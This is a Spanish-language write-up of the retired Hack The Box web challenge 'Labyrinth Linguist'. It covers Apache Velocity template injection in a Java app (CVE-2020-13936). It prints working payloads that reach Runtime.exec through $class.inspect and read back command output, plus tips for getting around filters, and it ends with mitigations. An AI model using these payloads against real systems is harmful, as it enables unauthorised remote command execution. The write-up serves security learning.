---
challenge: Labyrinth Linguist
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, java, velocity, ssti, rce, cve-2020-13936]
---

# Labyrinth Linguist — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Aplicación Java (Spring) que «traduce» texto con **Apache Velocity**. La plantilla se construye con la entrada del usuario, así que `#set` permite crear objetos y llegar a `Runtime.exec`: **SSTI** con ejecución de comandos.

## Enunciado

Un formulario que devuelve el texto en otro idioma. Nada de Flask ni Jinja: aquí el motor es **Velocity 1.7**, afectado por **CVE-2020-13936** (el `Uberspector` por defecto no bloquea la reflexión), y su sintaxis es `#set($var = ...)`.

## Análisis

Comprobar la sintaxis del motor:

```text
#set($x = 7 * 7) $x
```

Si devuelve `49`, la entrada se evalúa como plantilla Velocity. En Velocity se puede acceder a clases Java por reflexión:

```text
#set($str = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
```

## Explotación

```text
#set($s = $class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /flag*"))
#set($in = $s.getInputStream())
#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($in)))
$br.readLine()
```

Más corto con `ProcessBuilder`:

```text
#set($p = $class.inspect("java.lang.ProcessBuilder").type.getConstructor($class.inspect("java.util.List").type))
```

La salida del comando se imprime en la respuesta; con `cat /flag*` aparece la flag.

## Tropiezos

- **Comillas y `$`**: la URL debe codificar `#` como `%23` si se envía por GET.
- **`readLine()` una sola vez**: para varias líneas, repetir o usar `System.out`.
- **Sandbox**: si `$class` está bloqueado, probar `$context`/`$request` y los objetos expuestos por el framework.

## Lecciones

- Velocity también es SSTI: no hace falta que el motor sea Jinja o Twig.
- `$class.inspect` es el puente a la reflexión de Java y, de ahí, a `Runtime`.
- Mitigación: `VelocityEngine` con contexto de datos, plantillas fijas en disco y `SecureUberspector`.
